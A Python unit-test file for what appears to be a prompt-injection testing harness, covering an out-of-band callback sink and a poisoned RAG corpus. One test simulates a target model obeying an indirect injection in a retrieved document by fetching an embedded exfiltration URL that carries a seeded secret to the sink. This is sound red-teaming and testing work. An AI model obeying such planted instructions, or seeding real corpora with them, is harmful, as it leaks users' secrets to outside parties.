"""U3 verification backbone: the OOB sink and the injectable RAG corpus."""
import sys
import tempfile
import unittest
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import corpus
from oob_sink import Sink


class OobSinkTests(unittest.TestCase):
    def test_sink_records_callback_and_attributes_token(self):
        with Sink() as sink:
            urllib.request.urlopen(sink.url('tok123') + '?s=hello', timeout=5).read()
            hits = sink.received('tok123')
            self.assertEqual(len(hits), 1)
            self.assertIn('s=hello', hits[0]['path'])

    def test_unmatched_token_has_no_hits(self):
        with Sink() as sink:
            urllib.request.urlopen(sink.url('tok123'), timeout=5).read()
            self.assertEqual(sink.received('other'), [])

    def test_poisoned_document_exfils_seeded_secret_to_sink(self):
        # Stand in for the target following the indirect-injection instruction: fetch
        # the exfil URL embedded in the poisoned doc. The backbone must attribute the
        # seeded secret to the case independently of any target-reported output.
        with Sink() as sink:
            doc = corpus.poisoned_document(sink, 'case-rag-01')
            target = corpus.exfil_url(sink, 'case-rag-01')
            self.assertIn(target, doc)
            urllib.request.urlopen(target, timeout=5).read()
            hits = sink.received('case-rag-01')
            self.assertEqual(len(hits), 1)
            self.assertIn(corpus.SEEDED_SECRET, hits[0]['path'])

    def test_evidence_append_refuses_symlink(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / 'target.txt'
            target.write_text('')
            link = Path(directory) / 'oob.jsonl'
            link.symlink_to(target)
            with Sink(evidence_path=str(link)) as sink:
                urllib.request.urlopen(sink.url('x'), timeout=5).read()
                self.assertEqual(len(sink.received('x')), 1)  # recorded in memory
            self.assertEqual(target.read_text(), '')          # but not through the symlink


if __name__ == '__main__':
    unittest.main()
